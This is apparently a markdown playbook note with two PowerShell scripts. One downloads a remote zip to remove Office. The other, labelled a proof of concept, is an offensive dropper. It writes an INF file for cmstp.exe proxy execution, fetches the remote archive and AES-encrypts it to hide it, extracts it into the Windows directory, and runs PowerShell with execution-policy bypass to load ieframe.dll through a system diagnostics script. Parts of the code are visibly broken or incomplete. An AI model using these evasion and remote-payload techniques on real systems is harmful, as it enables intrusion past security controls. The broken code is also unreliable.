# Template.zip execution


### Based off a genuine script used to nuke office in Proactive-Issues

```powershell
$zip = "$env:HOMEDRIVE\SaRACMD.zip"
$Download = 'https://github.com/Calvindd2f/Methodologies/blob/main/cs_playbook/Template.zip?raw=true'
Add-Type -AssemblyName 'System.IO.Compression.Filesystem'

Invoke-WebRequest -Uri $Download -OutFile $zip
[IO.Compression.ZipFile]::ExtractToDirectory(('{0}' -f $zip),"$env:windir")
Start-Sleep -Seconds 2
Invoke-Expression -Command ("SaRACMD.exe '-S' 'OfficeScrubScenario'  '-AcceptEula' '-CloseOffice'")
```

## POC
```powershell

$Ignore = $env:TEMP + '\' + 'ignore.inf'

echo @'
# Ignore this driver (.inf)
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\Windows\ieframe.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
'@ > $Ignore

$Failover = cmstp.exe /s 




$key = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Random -Minimum 10000 -Maximum 99999)))
$data = Get-Content https://github.com/Calvindd2f/Methodologies/blob/main/cs_playbook/Template.zip?raw=true
$iv = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Random -Minimum 10000 -Maximum 99999)))
$cipher = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
$cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
$cipher.Key = [System.Convert]::FromBase64String($key)
$cipher.IV = [System.Convert]::FromBase64String($iv)

$encryptedData = $cipher.CreateEncryptor().TransformFinalBlock($data, 0, $data.Length)
$encodedData = [Convert]::ToBase64String($encryptedData)

$psScript = @"
$key = '$key'
$iv = '$iv'
$cipher = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
$cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
$cipher.Key = [System.Convert]::FromBase64String($key)
$cipher.IV = [System.Convert]::FromBase64String($iv)
$encryptedData = [Convert]::FromBase64String('$encodedData')
$decryptedData = $cipher.CreateDecryptor().TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
[System.IO.File]::WriteAllBytes('.\template.zip', $decryptedData)
$zip = '.\template.zip'
Add-Type -AssemblyName 'System.IO.Compression.Filesystem' -ErrorAction SilentlyContinue
CD $env:windir
[IO.Compression.ZipFile]::ExtractToDirectory(('{0}' -f $zip),"$env:windir")

powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\ieframe.dll;[Program.Class]::Main()"

$Failover + $Ignore

```
